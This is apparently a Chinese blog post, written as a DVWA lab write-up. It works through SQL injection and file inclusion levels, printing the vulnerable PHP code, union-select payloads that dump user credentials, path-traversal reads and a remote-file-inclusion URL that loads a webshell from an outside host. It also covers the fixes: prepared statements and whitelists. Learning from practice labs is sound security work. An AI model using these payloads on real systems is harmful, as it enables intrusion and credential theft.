@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="sql注入low查看源码，发现根本就没有对传入的id参数进行验证和过滤。直接用万能密码就可以绕过1’ or 1=1#为了讲的详细一点，我先把代码贴出来123456789101112131415161718192021222324&amp;lt;?phpif( isset( $_REQUEST[ &amp;apos;Submit&amp;apos; ] ) ) &amp;#123;    // Get input    $id =">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dvwa">
+<meta property="og:url" content="http://yoursite.com/2017/11/01/dvwa-1/index.html">
+<meta property="og:site_name" content="misaka的博客">
+<meta property="og:description" content="sql注入low查看源码，发现根本就没有对传入的id参数进行验证和过滤。直接用万能密码就可以绕过1’ or 1=1#为了讲的详细一点，我先把代码贴出来123456789101112131415161718192021222324&amp;lt;?phpif( isset( $_REQUEST[ &amp;apos;Submit&amp;apos; ] ) ) &amp;#123;    // Get input    $id =">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-11-01T11:13:19.659Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dvwa">
+<meta name="twitter:description" content="sql注入low查看源码，发现根本就没有对传入的id参数进行验证和过滤。直接用万能密码就可以绕过1’ or 1=1#为了讲的详细一点，我先把代码贴出来123456789101112131415161718192021222324&amp;lt;?phpif( isset( $_REQUEST[ &amp;apos;Submit&amp;apos; ] ) ) &amp;#123;    // Get input    $id =">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/11/01/dvwa-1/"/>
+
+
+
+
+
+  <title>dvwa | misaka的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">misaka的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-zhy">
+          <a href="/zhy" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            阳哥专用
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/01/dvwa-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="misaka">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="misaka的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">dvwa</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-01T19:13:13+08:00">
+                2017-11-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>查看源码，发现根本就没有对传入的id参数进行验证和过滤。直接用万能密码就可以绕过<br>1’ or 1=1#<br>为了讲的详细一点，我先把代码贴出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) &#123;</div><div class="line">    // Get input</div><div class="line">    $id = $_REQUEST[ &apos;id&apos; ];  //这里接受了用户传入的参数，并且没有检查与过滤</div><div class="line"></div><div class="line">    // Check database</div><div class="line">    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; //查询语句</div><div class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</div><div class="line"></div><div class="line">    // Get results</div><div class="line">    while( $row = mysqli_fetch_assoc( $result ) ) &#123;</div><div class="line">        // Get values</div><div class="line">        $first = $row[&quot;first_name&quot;];</div><div class="line">        $last  = $row[&quot;last_name&quot;];</div><div class="line"></div><div class="line">        // Feedback for end user</div><div class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>因为代码没有对传入的参数进行检查与过滤，那么攻击者就可以写恶意代码来攻击。这里我只写出我的Payload。<br>爆字段数：1’ union select 1,2 %23<br>得到字段数为2<br>爆当前数据库：1’ union select database(),1 %23<br>得到当前数据库为dvwa<br>爆表名：1’ union select 1,table_name from information_schema.tables where table_schema=database() %23<br>得到两张表：guestbook表和users表<br>爆users表中得列名：1’ union select 1,column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 %23<br><em>0x7573657273是users的16进制表示</em><br>得到了很多的表名，但一般我们比较关心user列和password列<br>爆字段：1’ union select user,password from dvwa.users %23<br>成功爆出admin和admin的密码的md5值。</p>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">if( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; </div><div class="line">    // Get input </div><div class="line">    $id = $_POST[ &apos;id&apos; ];   //使用post来传入参数，这样的话不会在地址栏显示</div><div class="line"></div><div class="line">    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); </div><div class="line"></div><div class="line">    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; </div><div class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; ); </div><div class="line"></div><div class="line">    // Get results </div><div class="line">    while( $row = mysqli_fetch_assoc( $result ) ) &#123; </div><div class="line">        // Display values </div><div class="line">        $first = $row[&quot;first_name&quot;]; </div><div class="line">        $last  = $row[&quot;last_name&quot;]; </div><div class="line"></div><div class="line">        // Feedback for end user </div><div class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; </div><div class="line">    &#125; </div><div class="line"></div><div class="line">&#125; </div><div class="line"></div><div class="line">// This is used later on in the index.php page </div><div class="line">// Setting it here so we can close the database connection in here like in the rest of the source scripts </div><div class="line">$query  = &quot;SELECT COUNT(*) FROM users;&quot;; </div><div class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); </div><div class="line">$number_of_rows = mysqli_fetch_row( $result )[0]; </div><div class="line"></div><div class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这份源码中，有个关键的php的函数不会，百度。<br>mysql_real_escape_string()：将\x00  \n  \r  \  ‘  ‘’  \x1a 这几个字符转义<br>嗯。。他过滤了单引号，这就很麻烦，然后接着分析代码。<br>发现 $query  = “SELECT first_name, last_name FROM users WHERE user_id = $id;”;<br>这是使用的数字型，数字型注入是不需要使用单引号来闭合语句的，所以过滤了单引号，但是却没有起到什么作用。<br>页面使用的是post提交的方式，然后页面是用的下拉框的方式来限制输入。<br>我试着构造如下语句，并用post提交<br>id=1&amp;Submit=Submit<br>成功注入<br>尝试爆出字段数：id=1 order by 2%23&amp;Submit=Submit<br>字段数为2<br>爆出当前数据库：id=1 union select database(),1%23&amp;Submit=Submit<br>当前数据库为dvwa，并且联合查询注入能使用，那么接下来的步骤就和low级别的差不多了。</p>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">if( isset( $_SESSION [ &apos;id&apos; ] ) ) &#123; </div><div class="line">    // Get input </div><div class="line">    $id = $_SESSION[ &apos;id&apos; ]; </div><div class="line"></div><div class="line">    // Check database </div><div class="line">    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; </div><div class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; ); </div><div class="line"></div><div class="line">    // Get results </div><div class="line">    while( $row = mysqli_fetch_assoc( $result ) ) &#123; </div><div class="line">        // Get values </div><div class="line">        $first = $row[&quot;first_name&quot;]; </div><div class="line">        $last  = $row[&quot;last_name&quot;]; </div><div class="line"></div><div class="line">        // Feedback for end user </div><div class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; </div><div class="line">    &#125; </div><div class="line"></div><div class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);         </div><div class="line">&#125; </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这份源码中，对sql查询语句进行了修改，在最后添加了limit 1，这样就只能显示一个查询结果，但是，这个也是可以很轻松的绕过的，因为在平时写注入语句的时候，在语句的最末尾会写一个注释符，这个注释符会将limit 1给过滤掉，使这个high级别的注入和low级别的注入几乎一摸一样 。<br>但是在high级别的注入页面是重新弹出的界面，这个我去查了下，目的是将提交页面和回显页面分开，这样的话，可以普通的sqlmap查询就不能注入了，因为sqlmap默认是在提交页面上获取回显，而这个，提交页面根本就没有回显。</p>
+<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; </div><div class="line">    // Check Anti-CSRF token </div><div class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </div><div class="line"></div><div class="line">    // Get input </div><div class="line">    $id = $_GET[ &apos;id&apos; ]; </div><div class="line"></div><div class="line">    // Was a number entered? </div><div class="line">    if(is_numeric( $id )) &#123; </div><div class="line">        // Check the database </div><div class="line">        $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); </div><div class="line">        $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); </div><div class="line">        $data-&gt;execute(); </div><div class="line">        $row = $data-&gt;fetch(); </div><div class="line"></div><div class="line">        // Make sure only 1 result is returned </div><div class="line">        if( $data-&gt;rowCount() == 1 ) &#123; </div><div class="line">            // Get values </div><div class="line">            $first = $row[ &apos;first_name&apos; ]; </div><div class="line">            $last  = $row[ &apos;last_name&apos; ]; </div><div class="line"></div><div class="line">            // Feedback for end user </div><div class="line">            echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line">// Generate Anti-CSRF token </div><div class="line">generateSessionToken(); </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>代码分析：<br>一：加入了验证Anti-CSRF token过程（对比客户端和服务器端的token），避免了csrf攻击<br>二：使用了PDO来链接数据库，避免sql注入。</p>
+<p>这个PDO我是第一次遇见，通过一波学习，我了解到一点关于它的知识：  </p>
+<ul>
+<li>无论使用哪种数据库，PDO可以用相同的方法来查询数据</li>
+<li>PDO::prepare 准备执行sql语句<br>这里是使用命名（：name）参数来准备sql语句的。（还可以使用？参数）<br>这两种方法都是提供了个模板，参数提交到服务器端的时候，参数和sql语句模板是分开的。比如说这道题的SQL语句模板传到服务器是这样的：SELECT first_name, last_name FROM users WHERE user_id = （：id） LIMIT 1;<br>Sql语句和变量是分开传到服务器的，并且变量是由mysql server转义的，而不是由php在本地转义（在本地的时候，sql语句模板没有与变量进行结合）。这样就有效的防御了sql注入。</li>
+<li>bindParam 将参数与变量名绑定在一起</li>
+<li>PDO::PARAM_INT 表示sql中的整型（预定义常量）<h3 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h3>我原来以为防止sql注入是需要写一堆的过滤，比如这种使用正则过滤关键字<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">while(preg_match(&apos;/(and|or|union|where|limit|group by|select|hex|substr)/i&apos;,$input))&#123;</div><div class="line">        $input=preg_replace(&apos;/(and|or|union|where|limit|group by|select|hex|substr)/i&apos;,&apos;&apos;,$input);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>现在我知道了PDO，使用这个技术就可以有效的抵御sql注入，这种技术我感觉方便，有效。<br>但是又经过一段时间的学习，我发现了仅仅又PDO技术也是不行的，PDO无法对表或字段的名字进行变量绑定，也就是说，当需要用户输入表名或字段名的时候，也是在本地动态组装sql语句，仍然会产生漏洞，也需要添加过滤函数。</p>
+<hr>
+<h2 id="file-inclusion"><a href="#file-inclusion" class="headerlink" title="file inclusion"></a>file inclusion</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">// The page we wish to display </div><div class="line">$file = $_GET[ &apos;page&apos; ]; </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>可以看出服务器端对传入的参数没有做检查和过滤，我们可以直接包含其他文件，因为此处没有上传点，所以我没有办法上传一句话（本人菜，其他大佬们应该又办法），那就只能读点文件了。<br>先随便输入点什么，使其报错，爆出路径：<br><a href="http://127.0.0.1/DVWA/vulnerabilities//fi/?page=adc" target="_blank" rel="external">http://127.0.0.1/DVWA/vulnerabilities//fi/?page=adc</a><br>爆出绝对路径：D:\phpStudy\WWW\DVWA\vulnerabilities\fi\index.php<br>然后就可以读取文件了，先读一下配置文件：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA\php.ini" target="_blank" rel="external">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA\php.ini</a><br>读出了以下信息：magic_quotes_gpc = Off allow_url_fopen on allow_url_include on<br>其实当页面没有错误提示时，我们也可以用../的方式来读文件。<br>例如：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../php.ini" target="_blank" rel="external">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../php.ini</a><br>返回错误，或没有返回，表示这个路径不正确，增加一个../<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../php.ini" target="_blank" rel="external">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../php.ini</a><br>这样就读出了文件。<br>使用../的方法可以连续使用多个../来进入根目录，然后查询文件。<br>读配置文件的时候，发现allow_url_fopen与allow_url_include都是打开的，这就说明除了本地文件包含，这里的漏洞还有远程文件包含。<br>虽然我没有远程服务器（这就很尴尬啦），没法实现远程文件包含，但是说说理论上的实现过程还是可以的。<br>假如我在我的服务器下有一个一句话木马，他的路径是233.233.6.66/abc.php<br>那么我就可以构造如下语句：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://233.233.6.66/abc.php" target="_blank" rel="external">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://233.233.6.66/abc.php</a><br>然后就可以用菜刀链接获取shell了。</p>
+<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">// The page we wish to display </div><div class="line">$file = $_GET[ &apos;page&apos; ]; </div><div class="line"></div><div class="line">// Input validation </div><div class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); </div><div class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>从源码中可以看出，一些字符串和一些符号被过滤了，但是只过滤了一次，使用双写就可以很轻松的绕过。比如<a href="http://就可以用hthttp://tp://来绕过。" target="_blank" rel="external">http://就可以用hthttp://tp://来绕过。</a><br>补救的办法可以循环执行str。_replace()函数，直到参数中不含有被过滤的字符串。<br>使用双写绕过后，此级别的题和low级别的题就是一摸一样的了。</p>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">// The page we wish to display </div><div class="line">$file = $_GET[ &apos;page&apos; ]; </div><div class="line"></div><div class="line">// Input validation </div><div class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; </div><div class="line">    // This isn&apos;t the page we want! </div><div class="line">    echo &quot;ERROR: File not found!&quot;; </div><div class="line">    exit; </div><div class="line">&#125; </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这份源码中使用了fnmatch()这个函数，查下资料，这个函数是根据指定的模式来匹配文件名或字符串。<br>在这道题里面，模式是file* ，也就是说，包含的文件名的开头必须是file，或者是include.php<br>这个我可以用file：//来绕过。File协议是用来访问本地文件的。<br>构造语句：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file://D:\phpStudy\WWW\DVWA\php.ini" target="_blank" rel="external">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file://D:\phpStudy\WWW\DVWA\php.ini</a><br>成功爆出配置信息。</p>
+<h3 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">// The page we wish to display </div><div class="line">$file = $_GET[ &apos;page&apos; ]; </div><div class="line"></div><div class="line">// Only allow include.php or file&#123;1..3&#125;.php </div><div class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; </div><div class="line">    // This isn&apos;t the page we want! </div><div class="line">    echo &quot;ERROR: File not found!&quot;; </div><div class="line">    exit; </div><div class="line">&#125; </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>Emmmm。。。。使用了白名单，写死了，参数只能是”include.php”，”file1.php”，”file2.php”，”file3.php”这四个中的一个，就避免了文件包含。</p>
+<h3 id="心得-1"><a href="#心得-1" class="headerlink" title="心得"></a>心得</h3><p>文件包含漏洞可以查看关键文件，若是有上传点的话，便可以上传一句话木马，拿到shell，若能使用远程文件包含的话，就不需要上传点了，直接远程包含一句话。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/11/辣鸡是谁/" rel="next" title="辣鸡是谁？？？">
+                <i class="fa fa-chevron-left"></i> 辣鸡是谁？？？
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/avatar.gif"
+              alt="misaka" />
+          
+            <p class="site-author-name" itemprop="name">misaka</p>
+            <p class="site-description motion-element" itemprop="description">学习使我快乐！！！(不接受反驳)</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入"><span class="nav-number">1.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low"><span class="nav-number">1.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium"><span class="nav-number">1.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high"><span class="nav-number">1.3.</span> <span class="nav-text">high</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible"><span class="nav-number">1.4.</span> <span class="nav-text">impossible</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#心得"><span class="nav-number">1.5.</span> <span class="nav-text">心得</span></a></li></ol></li><li class="nav-item 